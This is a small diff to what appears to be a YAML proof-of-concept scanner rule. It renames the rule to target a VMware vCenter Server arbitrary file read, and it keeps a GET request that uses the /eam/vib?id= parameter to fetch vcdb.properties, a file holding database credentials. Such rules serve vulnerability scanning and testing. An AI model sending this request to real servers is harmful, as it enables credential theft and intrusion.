@@ -1,4 +1,4 @@
-name: poc-yaml-e-bridge-anyfile-read
+name: poc-yaml-vmware-vcenterserveranyfile-read
 rules:
   - method: GET
     path: /eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties
